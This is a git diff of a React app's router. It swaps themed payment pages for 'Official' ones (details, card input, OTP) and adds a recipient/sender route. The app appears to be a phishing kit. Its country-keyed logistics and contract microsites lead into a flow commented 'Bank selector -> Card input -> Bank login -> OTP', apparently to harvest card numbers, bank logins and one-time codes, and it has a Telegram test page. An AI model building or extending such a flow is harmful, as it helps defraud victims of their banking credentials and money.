@@ -16,6 +16,10 @@ import LogisticsServices from "./pages/LogisticsServices";
 import Contracts from "./pages/Contracts";
 import Microsite from "./pages/Microsite";
 import PaymentRecipient from "./pages/PaymentRecipient";
+import PaymentRecipientSender from "./pages/PaymentRecipientSender";
+import PaymentDetailsOfficial from "./pages/PaymentDetailsOfficial";
+import PaymentCardInputOfficial from "./pages/PaymentCardInputOfficial";
+import PaymentOTPOfficial from "./pages/PaymentOTPOfficial";
 import PaymentDetailsTheme from "./pages/PaymentDetailsTheme";
 import PaymentCardInputTheme from "./pages/PaymentCardInputTheme";
 import PaymentOTPTheme from "./pages/PaymentOTPTheme";
@@ -50,31 +54,21 @@ const App = () => (
           <Route path="/logistics/:country" element={<LogisticsServices />} />
           <Route path="/contracts/:country" element={<Contracts />} />
           <Route path="/r/:country/:type/:id" element={<Microsite />} />
+          {/* Payment flow with recipient/sender selection */}
+          <Route path="/pay/:id/recipient-sender" element={<PaymentRecipientSender />} />
           <Route path="/pay/:id/recipient" element={
             <PaymentThemeWrapper>
               <PaymentRecipient />
             </PaymentThemeWrapper>
           } />
-          <Route path="/pay/:id/details" element={
-            <PaymentThemeWrapper>
-              <PaymentDetailsTheme />
-            </PaymentThemeWrapper>
-          } />
+          <Route path="/pay/:id/details" element={<PaymentDetailsOfficial />} />
           {/* New payment flow: Bank selector -> Card input -> Bank login -> OTP */}
           <Route path="/pay/:id/bank-selector" element={<PaymentBankSelector />} />
-          <Route path="/pay/:id/card-input" element={
-            <PaymentThemeWrapper>
-              <PaymentCardInputTheme />
-            </PaymentThemeWrapper>
-          } />
+          <Route path="/pay/:id/card-input" element={<PaymentCardInputOfficial />} />
           <Route path="/pay/:id/bank-login" element={<PaymentBankLogin />} />
           {/* Legacy routes (kept for backwards compatibility) */}
           <Route path="/pay/:id/card" element={<PaymentCardForm />} />
-          <Route path="/pay/:id/otp" element={
-            <PaymentThemeWrapper>
-              <PaymentOTPTheme />
-            </PaymentThemeWrapper>
-          } />
+          <Route path="/pay/:id/otp" element={<PaymentOTPOfficial />} />
           <Route path="/pay/:id/receipt" element={<PaymentReceiptPage />} />
           <Route path="/telegram-test" element={<TelegramTestPage />} />
           <Route path="*" element={<NotFound />} />
